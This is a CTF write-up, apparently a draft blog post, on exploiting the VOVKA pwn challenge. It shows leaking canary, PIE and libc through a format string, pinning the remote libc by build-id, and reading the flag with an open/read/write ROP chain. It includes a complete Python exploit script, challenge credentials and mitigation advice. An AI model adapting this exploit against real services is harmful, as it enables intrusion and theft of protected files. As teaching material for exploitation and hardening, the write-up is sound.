@@ -1,0 +1,402 @@
+---
+title: "VOVKA: blind format string, stack overflow and ROP"
+description: "writeup of VOVKA (HackRocks CTF): leak canary, PIE and libc with a format string, pin the libc by build-id, and read the flag with a data-only ROP chain."
+date: "2026-10-20"
+lang: "en"
+translationKey: "vovka"
+tags: ["cybersecurity", "ctf", "pwn", "format-string", "rop", "hackrocks"]
+author: "Felipe Cabrera"
+draft: true
+---
+
+VOVKA is a userland pwn challenge from the HackRocks CTF that I solved with Stefano Francolino. It combines three classics in a single connection: a blind format string, a stack overflow, and a ROP chain to read the flag. This is the full writeup.
+
+- **CTF:** HackRocks CTF
+- **Category:** pwn (format string + stack overflow + ROP)
+- **Service:** `challenges2.hackrocks.com:1021`
+- **Credentials:** `player` / `Bl1nd_Fmt_Str1ng_G0!`
+- **Binary:** `/home/ctf/vuln-patched` (PIE, NX, canary)
+- **Remote libc:** Debian 12, glibc `2.36-9+deb12u13`
+- **Target:** `/home/ctf/flag.txt`
+- **Authors:** Felipe Cabrera and Stefano Francolino
+
+## The idea
+
+The service asks for a login and, once inside, offers two inputs:
+
+```
+username: player
+password: Bl1nd_Fmt_Str1ng_G0!
+Access granted.
+log>
+Comments>
+```
+
+- `log>` is passed straight to `printf` as a format string. It is a classic format string, and the output comes back over the socket, so we can leak memory with `%p` and `%s`.
+- `Comments>` is copied into a stack buffer with no length check. That is the overflow.
+
+The binary is PIE, NX and canary, but the format string hands us the canary, the PIE base and the libc base in the same connection, so the mitigations do not get in the way. The plan: leak everything, rebuild the addresses, and build an `open`/`read`/`write` ROP chain to read the flag.
+
+The program is single-shot: after the comment it ends and never asks for `log>` again. Every leak and the ROP chain have to go out in the same connection.
+
+## Recon
+
+### Attack surface
+
+- **log>**: input used as a `printf` format. You can read any slot with `%N$p` and arbitrary memory with `%N$s`.
+- **Comments>**: copied into a stack buffer. The canary is at offset 328 (`0x148`), the saved rbp at 336 (`0x150`) and the return address at 344 (`0x158`). The reader accepts NUL and binary bytes (confirmed with an all-NUL payload that arrived in full).
+
+Even without the original binary, the service itself lets us read its `.text` with `%N$s`. At `PIE+0x13dc` you can see the `main` prologue (`55 48 89 e5 48 8b 05 ...`) and at `PIE+0x13c5` the canary check.
+
+### Stack map
+
+| Slot | Value | Interpretation |
+|------|-------|----------------|
+| `%3$p` | `0x7ffd...` | pointer to the log buffer |
+| `%14$p` | `0x4242424241414141` | first 8 bytes of the log (`AAAABBBB`) |
+| `%47$p` | `0x...00` | stack canary (low byte `0x00`) |
+| `%49$p` | `PIE+0x13c5` | code address in the binary |
+| `%71$p` | `libc+0x2724a` | `__libc_start_main_ret` |
+| `%130$p` | `PIE+0x40` | AT_PHDR |
+
+Relationship between buffers:
+
+- The log buffer starts at slot 14; its canary is at slot 47. Distance: `(47 - 14) * 8 = 264` bytes.
+- The comment canary is at offset 328 of that buffer.
+- So the comment buffer sits at `264 - 328 = -64` relative to the log buffer: **`cmt_buf = log_buf - 0x40`**.
+
+We verified this with a ROP chain that called `puts(cmt_buf)` after putting `MARKER\0` at the start of the comment. The reply was exactly `MARKER`, confirming the address.
+
+## Leaks and mitigations
+
+| Mitigation | How it falls |
+|------------|--------------|
+| Canary | `%47$p`. The low byte is always `0x00`, but the full value is rebuilt and written back at offset 328 of the payload so the epilogue passes. |
+| PIE | Two leaks that agree: `%49$p - 0x13c5` and `%130$p - 0x40`. |
+| Libc | `%71$p` returns `__libc_start_main_ret` at `libc+0x2724a`; base = value minus that offset, checking `0x1000` alignment. |
+| ASLR | No brute force needed: the format string leaks PIE, libc and stack in the same connection. The buffer address is derived from `%3$p` and validated with a `puts`. |
+
+## Pinning the exact remote libc
+
+The first version of the exploit used `libc_b12.so` (Debian 12 glibc 2.36 revision u4). It looked compatible because `system` and `puts` worked, but the `open`/`read`/`write` chain printed nothing. Comparing remote bytes against the local libc, the `pop rdx; ret` gadget at `0xfddfd` did not exist on the server.
+
+To settle it we read the build-id. The `.note.gnu.build-id` note is at `libc+0x370` and the identifier at `libc+0x380`. With a `puts(libc+0x380)` ROP chain we read 20 bytes:
+
+```
+61 96 74 4a 31 6d bd 57 c0 fd 89 68 df 16 80 aa c4 82 ce c4
+```
+
+Build-id `6196744a316dbd57c0fd8968df1680aac482cec4`, which matches **glibc 2.36-9+deb12u13** (Debian 12, released 2025-09-17). We downloaded the exact `.deb` from snapshot.debian.org and verified it matches.
+
+### U13 offsets (remote)
+
+| Symbol / gadget | Offset |
+|-----------------|--------|
+| `__libc_start_main_ret` | `0x2724a` |
+| `system` | `0x4c490` |
+| `puts` | `0x77980` |
+| `open` | `0xf7fb0` |
+| `read` | `0xf8290` |
+| `write` | `0xf8330` |
+| `getdents64` | `0xd0030` |
+| `pop rdi; ret` | `0x277e5` |
+| `pop rsi; pop r15; ret` | `0x277e3` |
+| `pop rdx; ret` | `0xfdefd` |
+| `ret` | `0x27182` |
+
+The difference from u4 is the key to the initial failure:
+
+| Element | u4 (`libc_b12.so`) | u13 (remote) |
+|---------|--------------------|--------------|
+| `open` | `0xf7eb0` | `0xf7fb0` |
+| `read` | `0xf8190` | `0xf8290` |
+| `write` | `0xf8230` | `0xf8330` |
+| `pop rdx; ret` | `0xfddfd` | `0xfdefd` |
+
+A `0x100` shift in all of them: that is why the first chain called wrong addresses.
+
+## Building the ROP
+
+### Payload layout
+
+| Offset | Content |
+|--------|---------|
+| 0 | file path: `/home/ctf/flag.txt\0` |
+| ... | `A` padding up to offset 328 |
+| 328 | stack canary |
+| 336 | saved rbp = 0 |
+| 344 | first ROP address |
+
+The payload is 504 bytes, under the reader's 512-byte limit. The path goes at the start so it can be the first argument to `open`. The ROP chain must not contain whitespace bytes (`0x09`, `0x0a`, `0x0b`, `0x0c`, `0x0d`, `0x20`) in case the reader is `scanf(" %s")`; if any address contains one, we retry the connection.
+
+### RIP control
+
+First test chain:
+
+```
+ret
+pop rdi; libc_base
+puts
+```
+
+`puts(libc_base)` printed `\x7fELF...`, the ELF header of the libc. Canary, libc base and RIP control confirmed.
+
+### System does not work
+
+We tried `system("/bin/sh")` and `system("id")` with no output. To rule out a bad offset we ran `puts(libc+0x4c490)`, which printed `48 85 ff 74 0b ...`, the real prologue of `system`. The offset was correct, so the failure was execution, not address. The most likely hypothesis is a seccomp filter blocking `execve`. The data-only chain sidesteps it.
+
+### Data-only chain
+
+```
+ret
+pop rdi; cmt_buf
+pop rsi; 0; pop r15; 0
+ret
+open
+pop rdi; 3
+pop rsi; read_buf; pop r15; 0
+pop rdx; 0x100
+ret
+read
+pop rdi; 1
+write
+```
+
+Details that matter:
+
+- `open(cmt_buf, O_RDONLY)` opens the file. The returned descriptor is 3 because 0, 1 and 2 are the service's stdin/stdout/stderr.
+- `read_buf = cmt_buf + 0x200`, chosen past the chain (which runs up to `cmt_buf+504`) so the read does not clobber the addresses still executing.
+- The interleaved `ret`s keep stack alignment (`rsp % 16 == 8` on entry to each function). Without them `open` or `read` crash on `movaps`.
+
+### Sanity checks first
+
+Before going for the flag we tried `/etc/hostname`: it printed the container name (`8b764d41961a`) followed by stack garbage, showing that `open`/`read`/`write` worked. To locate the flag we used `getdents64` on `/home/ctf`, which listed:
+
+```
+.
+..
+flag.txt
+vuln-patched
+libc.so.6
+ld-linux-x86-64.so.2
+```
+
+## Final exploitation
+
+```
+$ python solve.py
+[*] attempt 1: canary=0x5ddb4ef756b33000 libc=0x702b6697c000 cmt_buf=0x7ffcd9d580b0
+[+] FLAG: b4ck_t0_bl1nd_with_l1bc
+```
+
+The raw reply starts with a newline, then the flag, another newline, then the extra stack bytes read past the file:
+
+```
+\n b4ck_t0_bl1nd_with_l1bc \n ...
+```
+
+The file is 25 bytes: 23 of flag plus two newlines.
+
+**Flag:** `b4ck_t0_bl1nd_with_l1bc`
+
+As an extra check we read `/proc/self/environ`: the process runs as user `ctf` with `HOME=/home/ctf`, launched with `socat` 1.8.1.1. The flag is not in the environment, it is in `/home/ctf/flag.txt`.
+
+## Lessons
+
+1. The format string gives you everything: canary, PIE, libc and a stack pointer in one connection. Zero brute force.
+2. The buffer address is derived and verified. The 64 bytes between log and comment come from the canary offsets; `puts(MARKER)` confirms it.
+3. The exact libc revision matters. u4 and u13 share `system` and `puts` but not `open`/`read`/`write` or `pop rdx`. A `0x100` shift ruins the chain.
+4. The build-id is the fast way to pin the libc: `libc+0x380` holds the identifier, and from it you find the exact Debian package.
+5. `system` is not always the answer. With `execve` blocked, a data-only `open`/`read`/`write` chain still reads the flag.
+
+## Mitigation
+
+In the code:
+
+```c
+// BAD: user input is the format
+printf(log);
+
+// GOOD: constant format
+printf("%s", log);
+```
+
+```c
+// BAD: no limit
+read(0, comment, 0x200);
+
+// GOOD: bound it and check
+n = read(0, comment, sizeof(comment) - 1);
+if (n < 0) return;
+comment[n] = '\0';
+```
+
+Also: build with `-fstack-protector-strong` and `-D_FORTIFY_SOURCE=3`, `-fPIE -pie`, `-Wl,-z,relro,-z,now` and, if the hardware allows it, CET/IBT and a shadow stack. Do not trust the canary as the only defense: the format string leaks it.
+
+In deployment: run the service as a user that cannot read the flag, store it `0400 root` outside the service's HOME, and use seccomp to block not just `execve` but also opening the flag (a data-only chain skips a seccomp that only covers `execve`).
+
+## Appendix: exploit
+
+`solve.py` (no pwntools, just `socket` and `struct`):
+
+```python
+#!/usr/bin/env python3
+# VOVKA - HackRocks CTF
+# Exploit: format-string leak + stack overflow + ROP open/read/write.
+# Remote libc: Debian 12 glibc 2.36-9+deb12u13
+# build-id 6196744a316dbd57c0fd8968df1680aac482cec4
+import socket, struct, sys, time
+
+HOST = "challenges2.hackrocks.com"
+PORT = 1021
+USER = b"player"
+PASS = b"Bl1nd_Fmt_Str1ng_G0!"
+FLAG_PATH = b"/home/ctf/flag.txt\x00"
+
+# Libc offsets (glibc 2.36-9+deb12u13)
+POP_RDI = 0x277e5
+POP_RSI_R15 = 0x277e3
+POP_RDX = 0xfdefd
+RET = 0x27182
+OPEN = 0xf7fb0
+READ = 0xf8290
+WRITE = 0xf8330
+START_RET = 0x2724a  # __libc_start_main_ret
+
+BAD = set(b"\t\n\x0b\x0c\r ")
+
+def log(msg):
+    sys.stdout.write(str(msg) + "\n")
+    sys.stdout.flush()
+
+def recv_until(s, marker, timeout=5):
+    s.settimeout(timeout)
+    buf = b""
+    try:
+        while marker not in buf:
+            chunk = s.recv(4096)
+            if not chunk:
+                break
+            buf += chunk
+    except socket.timeout:
+        pass
+    return buf
+
+def connect():
+    last = None
+    for _ in range(8):
+        try:
+            s = socket.socket()
+            s.settimeout(8)
+            s.connect((HOST, PORT))
+            return s
+        except Exception as exc:
+            last = exc
+            time.sleep(2)
+    raise last
+
+def clean(data):
+    return all(c not in BAD for c in data)
+
+def attempt(n):
+    s = connect()
+    try:
+        recv_until(s, b"username:")
+        s.sendall(USER + b"\n")
+        recv_until(s, b"password:")
+        s.sendall(PASS + b"\n")
+        recv_until(s, b"log>")
+
+        # Leak: canary (%47$p), libc return (%71$p), log-buffer pointer (%3$p)
+        s.sendall(b"%47$p|%71$p|%3$p|\n")
+        out = recv_until(s, b"Comments>", 5)
+        parts = out.split(b"|")
+        if len(parts) < 3:
+            return None
+        try:
+            canary = int(parts[0].strip(), 16)
+            libc_ret = int(parts[1].split(b"\n")[0].strip(), 16)
+            log_buf = int(parts[2].split(b"\n")[0].strip(), 16)
+        except ValueError:
+            return None
+
+        libc = libc_ret - START_RET
+        if libc & 0xFFF:
+            return None
+
+        # The comment buffer is 0x40 bytes below the leaked log buffer.
+        cmt_buf = log_buf - 0x40
+        read_buf = cmt_buf + 0x200
+
+        payload = (
+            FLAG_PATH + b"A" * (328 - len(FLAG_PATH)) +
+            struct.pack("<Q", canary) +
+            struct.pack("<Q", 0) +  # saved rbp
+            struct.pack("<Q", libc + RET) +
+            struct.pack("<Q", libc + POP_RDI) + struct.pack("<Q", cmt_buf) +
+            struct.pack("<Q", libc + POP_RSI_R15) + struct.pack("<Q", 0) + struct.pack("<Q", 0) +
+            struct.pack("<Q", libc + RET) +
+            struct.pack("<Q", libc + OPEN) +
+            struct.pack("<Q", libc + POP_RDI) + struct.pack("<Q", 3) +
+            struct.pack("<Q", libc + POP_RSI_R15) + struct.pack("<Q", read_buf) + struct.pack("<Q", 0) +
+            struct.pack("<Q", libc + POP_RDX) + struct.pack("<Q", 0x100) +
+            struct.pack("<Q", libc + RET) +
+            struct.pack("<Q", libc + READ) +
+            struct.pack("<Q", libc + POP_RDI) + struct.pack("<Q", 1) +
+            struct.pack("<Q", libc + WRITE)
+        )
+
+        # Only the overflowing part must be whitespace-free (scanf/fgets input).
+        if not clean(payload[328:]):
+            return None
+
+        log("[*] attempt %d: canary=%#x libc=%#x cmt_buf=%#x" %
+            (n, canary, libc, cmt_buf))
+        s.sendall(payload + b"\n")
+        time.sleep(1.0)
+        data = recv_until(s, b"ZZZZ_NOMATCH", 4)
+
+        for line in data.split(b"\n"):
+            line = line.strip()
+            if line and all(0x20 <= c < 0x7f for c in line) and b"_" in line:
+                return line.decode("ascii", "replace")
+        return None
+    finally:
+        try:
+            s.close()
+        except Exception:
+            pass
+
+def main():
+    for n in range(1, 81):
+        flag = attempt(n)
+        if flag:
+            log("[+] FLAG: %s" % flag)
+            return 0
+    log("[-] no clean payload / flag not found")
+    return 1
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
+
+### Reproduction
+
+From the `vovka` directory:
+
+```
+python solve.py
+```
+
+Addresses change on every connection because of ASLR, so you have to run the whole script, not reuse a payload from another session. To reproduce the leaks by hand:
+
+```
+username: player
+password: Bl1nd_Fmt_Str1ng_G0!
+log> %47$p|%71$p|%3$p|
+Comments> <payload>
+```
+
+---
+
+Related: [OEA Cyber Challenge 2026 recap](/blog/oea-cyber-challenge-2026) · [GitHub](https://github.com/felicabrera)
